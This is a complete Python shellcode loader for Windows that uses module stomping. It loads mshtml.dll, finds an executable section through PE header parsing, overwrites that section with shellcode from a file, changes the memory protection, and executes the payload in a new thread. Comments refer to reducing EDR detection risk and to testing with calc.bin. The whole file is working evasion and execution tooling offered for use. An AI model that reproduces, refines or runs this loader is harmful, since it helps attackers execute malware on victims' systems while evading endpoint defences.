import ctypes
import sys
from ctypes import wintypes

# --- WinAPI Function Definitions ---
kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)

# LoadLibraryExW
kernel32.LoadLibraryExW.argtypes = [wintypes.LPCWSTR, wintypes.HANDLE, wintypes.DWORD]
kernel32.LoadLibraryExW.restype = wintypes.HMODULE

# VirtualProtect
kernel32.VirtualProtect.argtypes = [
    wintypes.LPVOID,    # lpAddress
    wintypes.SIZE_T,    # dwSize  <-- FIX: Corrected from wintypes.SIZE to wintypes.SIZE_T
    wintypes.DWORD,     # flNewProtect
    wintypes.LPDWORD,   # lpflOldProtect
]
kernel32.VirtualProtect.restype = wintypes.BOOL

# CreateThread
kernel32.CreateThread.argtypes = [
    wintypes.LPVOID,    # lpThreadAttributes (security descriptor)
    wintypes.SIZE_T,    # dwStackSize  <-- FIX: Corrected from wintypes.SIZE to wintypes.SIZE_T
    wintypes.LPVOID,    # lpStartAddress (thread routine)
    wintypes.LPVOID,    # lpParameter
    wintypes.DWORD,     # dwCreationFlags
    wintypes.LPDWORD,   # lpThreadId
]
kernel32.CreateThread.restype = wintypes.HANDLE

# WaitForSingleObject
kernel32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]
kernel32.WaitForSingleObject.restype = wintypes.DWORD

# CloseHandle
kernel32.CloseHandle.argtypes = [wintypes.HANDLE]
kernel32.CloseHandle.restype = wintypes.BOOL

# FreeLibrary (for cleanup, though process might exit before it's called)
kernel32.FreeLibrary.argtypes = [wintypes.HMODULE]
kernel32.FreeLibrary.restype = wintypes.BOOL

# --- PE Structure Definitions (Simplified for our needs) ---
# These structures are used to parse the PE header of the loaded DLL
# to find an executable section for stomping.

class IMAGE_DOS_HEADER(ctypes.Structure):
    _fields_ = [
        ("e_magic", wintypes.WORD),
        ("e_cblp", wintypes.WORD),
        ("e_cp", wintypes.WORD),
        ("e_crlc", wintypes.WORD),
        ("e_cparhdr", wintypes.WORD),
        ("e_minalloc", wintypes.WORD),
        ("e_maxalloc", wintypes.WORD),
        ("e_ss", wintypes.WORD),
        ("e_sp", wintypes.WORD),
        ("e_csum", wintypes.WORD),
        ("e_ip", wintypes.WORD),
        ("e_cs", wintypes.WORD),
        ("e_lfarlc", wintypes.WORD),
        ("e_ovno", wintypes.WORD),
        ("e_res", wintypes.WORD * 4),
        ("e_oemid", wintypes.WORD),
        ("e_oeminfo", wintypes.WORD),
        ("e_res2", wintypes.WORD * 10),
        ("e_lfanew", wintypes.LONG), # Offset to NT Headers
    ]

class IMAGE_FILE_HEADER(ctypes.Structure):
    _fields_ = [
        ("Machine", wintypes.WORD),
        ("NumberOfSections", wintypes.WORD),
        ("TimeDateStamp", wintypes.DWORD),
        ("PointerToSymbolTable", wintypes.DWORD),
        ("NumberOfSymbols", wintypes.DWORD),
        ("SizeOfOptionalHeader", wintypes.WORD),
        ("Characteristics", wintypes.WORD),
    ]

class IMAGE_DATA_DIRECTORY(ctypes.Structure):
    _fields_ = [
        ("VirtualAddress", wintypes.DWORD),
        ("Size", wintypes.DWORD),
    ]

class IMAGE_OPTIONAL_HEADER64(ctypes.Structure):
    _fields_ = [
        ("Magic", wintypes.WORD), # 0x20B for PE32+ (x64)
        ("MajorLinkerVersion", wintypes.BYTE),
        ("MinorLinkerVersion", wintypes.BYTE),
        ("SizeOfCode", wintypes.DWORD),
        ("SizeOfInitializedData", wintypes.DWORD),
        ("SizeOfUninitializedData", wintypes.DWORD),
        ("AddressOfEntryPoint", wintypes.DWORD),
        ("BaseOfCode", wintypes.DWORD),
        ("ImageBase", ctypes.c_ulonglong), # FIX: Changed from wintypes.ULONGLONG to ctypes.c_ulonglong
        ("SectionAlignment", wintypes.DWORD),
        ("FileAlignment", wintypes.DWORD),
        ("MajorOperatingSystemVersion", wintypes.WORD),
        ("MinorOperatingSystemVersion", wintypes.WORD),
        ("MajorImageVersion", wintypes.WORD),
        ("MinorImageVersion", wintypes.WORD),
        ("MajorSubsystemVersion", wintypes.WORD),
        ("MinorSubsystemVersion", wintypes.WORD),
        ("Win32VersionValue", wintypes.DWORD),
        ("SizeOfImage", wintypes.DWORD),
        ("SizeOfHeaders", wintypes.DWORD),
        ("CheckSum", wintypes.DWORD),
        ("Subsystem", wintypes.WORD),
        ("DllCharacteristics", wintypes.WORD),
        ("SizeOfStackReserve", ctypes.c_ulonglong), # FIX: Changed from wintypes.ULONGLONG to ctypes.c_ulonglong
        ("SizeOfStackCommit", ctypes.c_ulonglong),  # FIX: Changed from wintypes.ULONGLONG to ctypes.c_ulonglong
        ("SizeOfHeapReserve", ctypes.c_ulonglong),  # FIX: Changed from wintypes.ULONGLONG to ctypes.c_ulonglong
        ("SizeOfHeapCommit", ctypes.c_ulonglong),   # FIX: Changed from wintypes.ULONGLONG to ctypes.c_ulonglong
        ("LoaderFlags", wintypes.DWORD),
        ("NumberOfRvaAndSizes", wintypes.DWORD),
        ("DataDirectory", IMAGE_DATA_DIRECTORY * 16),
    ]

class IMAGE_NT_HEADERS64(ctypes.Structure):
    _fields_ = [
        ("Signature", wintypes.DWORD), # 0x00004550 for PE00
        ("FileHeader", IMAGE_FILE_HEADER),
        ("OptionalHeader", IMAGE_OPTIONAL_HEADER64),
    ]

class IMAGE_SECTION_HEADER(ctypes.Structure):
    _fields_ = [
        ("Name", ctypes.c_char * 8),
        ("VirtualSize", wintypes.DWORD),
        ("VirtualAddress", wintypes.DWORD),
        ("SizeOfRawData", wintypes.DWORD),
        ("PointerToRawData", wintypes.DWORD),
        ("PointerToRelocations", wintypes.DWORD),
        ("PointerToLinenumbers", wintypes.DWORD),
        ("NumberOfRelocations", wintypes.WORD),
        ("NumberOfLinenumbers", wintypes.WORD),
        ("Characteristics", wintypes.DWORD),
    ]

# --- Constants ---
PAGE_EXECUTE_READWRITE = 0x40
PAGE_EXECUTE_READ = 0x20
INFINITE = 0xFFFFFFFF

# Section Characteristics (relevant for finding executable sections)
IMAGE_SCN_MEM_EXECUTE = 0x20000000
IMAGE_SCN_MEM_READ = 0x40000000

# Thread function type for CreateThread
LPTHREAD_START_ROUTINE = ctypes.WINFUNCTYPE(wintypes.DWORD, wintypes.LPVOID)

def main():
    if len(sys.argv) < 2:
        print("Usage: python loader.py <path_to_shellcode.bin>")
        sys.exit(1)

    shellcode_file_path = sys.argv[1]
    try:
        with open(shellcode_file_path, 'rb') as f:
            shellcode = f.read()
    except FileNotFoundError:
        print(f"[-] Error: Shellcode file not found at '{shellcode_file_path}'")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Error reading shellcode file: {e}")
        sys.exit(1)

    shellcode_size = len(shellcode)
    if shellcode_size == 0:
        print("[-] Error: Shellcode file is empty.")
        sys.exit(1)

    print(f"[*] Loaded shellcode of {shellcode_size} bytes from '{shellcode_file_path}'")

    # Load a legitimate DLL to stomp
    dll_name = "mshtml.dll" # A common DLL with executable sections
    hModule = kernel32.LoadLibraryExW(dll_name, None, 0) # 0 means default flags
    if not hModule:
        print(f"[-] Failed to load '{dll_name}'. Error: {ctypes.get_last_error()}")
        sys.exit(1)
    print(f"[*] Loaded '{dll_name}' at base address: {hex(hModule)}")

    # Parse PE headers to find a suitable executable section
    dll_base_address = hModule
    target_section_address = 0
    target_section_size = 0
    found_section = False

    try:
        # Cast base address to DOS header
        dos_header = IMAGE_DOS_HEADER.from_address(dll_base_address)
        if dos_header.e_magic != 0x5A4D: # Check for MZ magic
            raise ValueError("Invalid DOS header magic (not MZ).")

        # Calculate address of NT Headers
        nt_headers_addr = dll_base_address + dos_header.e_lfanew
        nt_headers = IMAGE_NT_HEADERS64.from_address(nt_headers_addr)
        if nt_headers.Signature != 0x00004550: # Check for PE00 signature
            raise ValueError("Invalid NT header signature (not PE00).")
        if nt_headers.OptionalHeader.Magic != 0x20B: # Check for PE32+ (x64) magic
            raise ValueError("Not an x64 PE file (OptionalHeader.Magic is not 0x20B).")

        # Calculate address of the first section header
        section_header_start = nt_headers_addr + ctypes.sizeof(IMAGE_NT_HEADERS64)

        # Iterate through sections to find an executable one
        for i in range(nt_headers.FileHeader.NumberOfSections):
            section_header = IMAGE_SECTION_HEADER.from_address(section_header_start + i * ctypes.sizeof(IMAGE_SECTION_HEADER))
            section_name = section_header.Name.decode('utf-8', errors='ignore').strip('\x00')

            # Look for executable and readable sections (e.g., .text)
            if (section_header.Characteristics & IMAGE_SCN_MEM_EXECUTE) and \
               (section_header.Characteristics & IMAGE_SCN_MEM_READ):
                
                current_section_virtual_size = section_header.VirtualSize
                current_section_address = dll_base_address + section_header.VirtualAddress

                # Ensure the shellcode fits within the section's virtual size
                if current_section_virtual_size >= shellcode_size:
                    target_section_address = current_section_address
                    # We only need to protect/write the size of our shellcode
                    target_section_size = shellcode_size 
                    print(f"[*] Found suitable executable section '{section_name}' at {hex(target_section_address)} "
                          f"with virtual size {current_section_virtual_size} bytes.")
                    found_section = True
                    break # Found a suitable section, break the loop

    except Exception as e:
        print(f"[-] Error during PE parsing: {e}")
        kernel32.FreeLibrary(hModule) # Clean up
        sys.exit(1)

    if not found_section:
        print(f"[-] Could not find a suitable executable section in '{dll_name}' to stomp the shellcode. "
              "Shellcode might be too large or no suitable section found.")
        kernel32.FreeLibrary(hModule) # Clean up
        sys.exit(1)

    # Change memory protection to PAGE_EXECUTE_READWRITE for writing
    old_protect = wintypes.DWORD(0)
    if not kernel32.VirtualProtect(
        target_section_address,
        target_section_size,
        PAGE_EXECUTE_READWRITE,
        ctypes.byref(old_protect)
    ):
        print(f"[-] Failed to change memory protection for writing. Error: {ctypes.get_last_error()}")
        kernel32.FreeLibrary(hModule)
        sys.exit(1)
    print(f"[*] Changed protection of {hex(target_section_address)} (size {target_section_size}) to PAGE_EXECUTE_READWRITE. Old protection: {hex(old_protect.value)}")

    # Copy shellcode into the stomped memory region
    ctypes.memmove(target_section_address, shellcode, shellcode_size)
    print(f"[*] Shellcode copied to {hex(target_section_address)}")

    # Revert memory protection to PAGE_EXECUTE_READ for execution
    # This minimizes the time the memory region has RWX permissions.
    final_old_protect_after_revert = wintypes.DWORD(0)
    if not kernel32.VirtualProtect(
        target_section_address,
        target_section_size,
        PAGE_EXECUTE_READ, # Target protection for execution
        ctypes.byref(final_old_protect_after_revert)
    ):
        print(f"[-] Failed to revert memory protection to PAGE_EXECUTE_READ. Error: {ctypes.get_last_error()}")
        # The shellcode might still execute with RWX, but this is a higher EDR risk.
    else:
        print(f"[*] Reverted protection of {hex(target_section_address)} to PAGE_EXECUTE_READ. Old protection before revert: {hex(final_old_protect_after_revert.value)}")

    # Execute the shellcode using CreateThread
    ShellcodeFunc = LPTHREAD_START_ROUTINE(target_section_address)

    print(f"[*] Executing shellcode from {hex(target_section_address)}...")

    thread_id = wintypes.DWORD(0)
    hThread = kernel32.CreateThread(
        None,               # lpThreadAttributes (default security descriptor)
        0,                  # dwStackSize (default stack size)
        ShellcodeFunc,      # lpStartAddress (our shellcode entry point)
        None,               # lpParameter (no parameter for shellcode)
        0,                  # dwCreationFlags (run immediately)
        ctypes.byref(thread_id) # lpThreadId
    )

    if not hThread:
        print(f"[-] Failed to create thread. Error: {ctypes.get_last_error()}")
        kernel32.FreeLibrary(hModule)
        sys.exit(1)

    print(f"[*] Thread created with ID: {thread_id.value}")

    # Wait for the shellcode thread to finish
    # For calc.bin, this means waiting for calc.exe to launch and the shellcode thread to exit.
    kernel32.WaitForSingleObject(hThread, INFINITE)
    print("[*] Shellcode execution finished (thread terminated).")

    # Clean up thread handle
    kernel32.CloseHandle(hThread)
    
    # Free the loaded DLL. Note: If the shellcode creates long-running processes or
    # injects into others, freeing the DLL might be handled differently or not at all.
    # For a simple calc.bin, the process will likely exit soon after.
    # If the shellcode itself uses this DLL, freeing it might cause issues.
    # For now, we'll assume a short-lived shellcode that doesn't rely on the host DLL after execution.
    # kernel32.FreeLibrary(hModule) # Commented out for safety with calc.bin, as it might exit the host process before this is called.

    print("[*] Loader finished.")

if __name__ == "__main__":
    main()